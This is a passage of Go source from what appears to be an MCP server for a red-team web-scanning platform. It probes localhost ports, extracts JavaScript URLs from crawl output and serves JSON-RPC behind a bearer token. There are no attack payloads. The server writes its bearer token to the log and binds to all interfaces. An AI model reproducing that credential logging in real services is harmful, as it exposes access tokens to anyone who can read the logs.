	for _, s := range ss {
		s = strings.TrimSpace(s)
		if s == "" {
			continue
		}
		if _, ok := seen[s]; ok {
			continue
		}
		seen[s] = struct{}{}
		out = append(out, s)
	}
	return out
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

func scoreLevel(score int) string {
	switch {
	case score >= 90:
		return "critical"
	case score >= 70:
		return "high"
	case score >= 40:
		return "medium"
	case score >= 20:
		return "low"
	default:
		return "info"
	}
}

// detectPlatformURL 自动探测 dhunter 平台 URL,扫 127.0.0.1 上的常见端口。
// 默认 webhunter 跟 platform 一起跑(同一台机器),platform 端口可能在 13343/8080/8081。
func detectPlatformURL() string {
	candidates := []string{
		"http://127.0.0.1:13343",
		"http://127.0.0.1:8080",
		"http://127.0.0.1:8081",
		"http://127.0.0.1:8082",
		"http://127.0.0.1:3000",
	}
	client := &http.Client{Timeout: 500 * time.Millisecond}
	for _, u := range candidates {
		resp, err := client.Get(u + "/api/external-mcp")
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode < 500 {
			// 200=未授权 401/403=认证,都能说明端口在跑 platform
			return u
		}
	}
	// 探测失败也默认 13343(用户最常用)
	return "http://127.0.0.1:13343"
}

func extractJSURLs(base string, crawlOut string) []string {
	jsRegex := regexp.MustCompile(`(?i)["'](https?://[^"'\s]+\.js(?:\?[^"'\s]*)?)["']|["']([^"'\s]+\.js(?:\?[^"'\s]*)?)["']`)
	matches := jsRegex.FindAllStringSubmatch(crawlOut, -1)
	seen := map[string]struct{}{}
	out := []string{}
	parsed, _ := url.Parse(base)
	for _, m := range matches {
		var u string
		if m[1] != "" {
			u = m[1]
		} else {
			u = m[2]
		}
		if !strings.HasPrefix(u, "http") && parsed != nil {
			if strings.HasPrefix(u, "/") {
				u = parsed.Scheme + "://" + parsed.Host + u
			} else {
				u = parsed.Scheme + "://" + parsed.Host + "/" + u
			}
		}
		if _, ok := seen[u]; ok {
			continue
		}
		seen[u] = struct{}{}
		out = append(out, u)
	}
	return out
}

func main() {
	var (
		addr         = flag.String("addr", "0.0.0.0:9124", "listen addr (与 gsl5-mock 9123 错开)")
		token        = flag.String("t", defaultToken, "bearer token (必须与 platform external_mcp.webhunter.headers 一致)")
		platformURL  = flag.String("platform-url", "", "dhunter 平台 URL,默认探测 127.0.0.1 上的 13343/8080/8081 等")
	)
	flag.Parse()

	// 探测 platform URL:如果用户没指定,扫常见端口找一个能 connect 的
	if *platformURL == "" {
		if u := os.Getenv("PLATFORM_URL"); u != "" {
			*platformURL = u
		} else if u := os.Getenv("DESREDTEAM_URL"); u != "" {
			*platformURL = u
		}
	}
	if *platformURL == "" {
		*platformURL = detectPlatformURL()
	}
	if *platformURL != "" {
		// 让 write_finding 默认用这个 URL(不依赖 os.Getenv)
		_ = os.Setenv("DESREDTEAM_URL", *platformURL)
		log.Printf("dhunter platform URL: %s", *platformURL)
	}

	// 兼容 gsl5 端点 /message,但同时支持 /webhook(便于将来扩展)
	mux := http.NewServeMux()
	mux.HandleFunc("/healthz", handleHealthz)
	mux.HandleFunc("/message", handleJSONRPC)
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/" {
			writeJSON(w, 200, map[string]interface{}{
				"service": "dhunter-mcp",
				"version": "0.1.0",
				"tools":   len(toolsList()),
				"endpoints": []string{"/message", "/healthz"},
			})
			return
		}
		http.NotFound(w, r)
	})
	h := authMiddleware(*token, mux)
	log.Printf("dhunter-mcp listening on %s (token=%s, %d tools)", *addr, *token, len(toolsList()))
	_ = filepath.Separator
	_ = net.IPv4
	srv := &http.Server{Addr: *addr, Handler: h, ReadHeaderTimeout: 10 * time.Second}
	if err := srv.ListenAndServe(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
